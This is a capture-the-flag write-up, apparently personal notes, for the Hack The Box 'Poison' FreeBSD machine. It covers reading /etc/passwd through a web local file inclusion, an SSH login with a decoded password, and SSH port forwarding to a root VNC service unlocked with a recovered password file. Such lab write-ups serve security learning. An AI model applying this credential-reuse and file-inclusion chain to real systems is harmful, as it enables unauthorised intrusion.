
### Initial access
Testing function base main website
![[Assets/Pasted image 20260904185026.png]]

We recon and see this
![[Assets/Pasted image 20260904184952.png]]
Decode by hint we get password
```
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ cat pass13                     
Charix!2#4%6&8(0                                                                                                                                                            
```
Cuz the funcion we have in web app is have lfi so we can read /etc/passwd to detect user of the system for ssh
![[Assets/Pasted image 20260904192246.png]]

```bash
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ ssh charix@10.129.1.254                                                                   
(charix@10.129.1.254) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
If you `set watch = (0 any any)' in tcsh, you will be notified when
someone logs in or out of your system.
charix@Poison:~ % 


```
### Priv escalation
We install secret.zip in user folder extart it with user password
```
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ zip2john secret.zip > zip.hash
ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0
                                                                                                                                                                                              
─(kali㉿kali)-[~/HTB/Poison]
└─$ unzip secret.zip

Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ ls           
nmap_full  nmap_ports.txt  nmap_sVsC.txt  nmap_vuln.txt  pass  pass1  pass10  pass11  pass12  pass13  pass2  pass3  pass4  pass5  pass6  pass7  pass8  pass9  secret  secret.zip  zip.hash
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ cat secret   
��[|Ֆz!                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ file secret                                                                                                                         
secret: Non-ISO extended-ASCII text, with no line terminators
 
```

We see vnc service after i reseach i see that file secret is the key to using vnc in bds system so let portforwading it
```bash
charix@Poison:~ % sockstat -4l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      817   4  tcp4   *:80                  *:*
www      httpd      815   4  tcp4   *:80                  *:*
www      httpd      812   4  tcp4   *:80                  *:*
www      httpd      798   4  tcp4   *:80                  *:*
www      httpd      786   4  tcp4   *:80                  *:*
root     sendmail   721   3  tcp4   127.0.0.1:25          *:*
www      httpd      720   4  tcp4   *:80                  *:*
www      httpd      719   4  tcp4   *:80                  *:*
www      httpd      718   4  tcp4   *:80                  *:*
www      httpd      717   4  tcp4   *:80                  *:*
www      httpd      716   4  tcp4   *:80                  *:*
root     httpd      704   4  tcp4   *:80                  *:*
root     sshd       699   4  tcp4   *:22                  *:*
root     Xvnc       608   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       608   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    469   7  udp4   *:514                 *:*
charix@Poison:~ % exit
logout
Connection to 10.129.1.254 closed.
                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Poison]
└─$ ssh -L 5901:127.0.0.1:5901  charix@10.129.1.254

┌──(kali㉿kali)-[~/HTB/Poison]
└─$ vncviewer -passwd secret 127.0.0.1::5901

```

We have root access
![[Assets/Pasted image 20260904194413.png]]